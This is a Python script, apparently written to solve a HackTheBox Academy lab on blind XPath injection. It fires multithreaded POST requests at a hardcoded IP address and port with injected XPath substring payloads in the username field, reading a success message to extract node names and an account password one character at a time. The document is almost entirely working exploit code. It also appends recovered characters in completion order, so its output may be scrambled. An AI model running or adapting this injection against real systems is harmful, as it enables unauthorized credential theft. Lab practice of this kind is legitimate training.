#! /usr/bin/env python3
# Created to solve the lab on HackTheBox Academy called 'XPath Blind Exploitation'.
# This script runs a Blind XPath injection attack on the target

import requests
import concurrent.futures
import string

# Create numlist and charlist
def create_numlist():
    return list(range(1,50))
def create_charlist():
    clist= list(string.printable)
    clist.remove('&')
    return clist

# Run blind xpath injection
def blind_xpath_injection(num,char):
    target= f"94.237.54.201:56676"
    proxies= {"http":"http://127.0.0.1:8080"}
    headers= {"Content-type":"application/x-www-form-urlencoded"}   
    #data= f"username=invalid'+or+substring(name(/*[1]),{num},1)='{char}'+and+'1'='1&msg=test"
    #data= f"username=invalid'+or+substring(name(/*[1]/*[1]),{num},1)='{char}'+and+'1'='1&msg=test"
    #data= f"username=invalid'+or+substring(name(/*[1]/*[1]/*[1]),{num},1)='{char}'+and+'1'='1&msg=test"
    #data= f"username=invalid'+or+substring(name(/*[1]/*[1]/*[2]),{num},1)='{char}'+and+'1'='1&msg=test"
    #data= f"username=invalid'+or+substring(/accounts/acc[1]/username,{num},1)='{char}'+and+'1'='1&msg=test"
    data= f"username=invalid'+or+substring(/accounts/acc[1]/password,{num},1)='{char}'+and+'1'='1&msg=test"
    
    response= requests.post(url=f"http://{target}/index.php", proxies=proxies, headers=headers, data=data) 
    for line in response.text.splitlines():
        if "successfully sent" in line:
            return char
        else:
            pass
            
# Increase speed with multithreading
def increase_speed():
    complete_word=""
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        numlist= create_numlist()
        charlist= create_charlist()
        future_response= {executor.submit(blind_xpath_injection, num, char): (num,char) for num in numlist for char in charlist}
        for future in concurrent.futures.as_completed(future_response):
            result= future.result()
            if result is not None:
                complete_word+=result
                print(f"{complete_word}")
            else:
                pass
try:
    increase_speed()
except KeyboardInterrupt:
    print("ctrl +c detected, exiting gracefully")
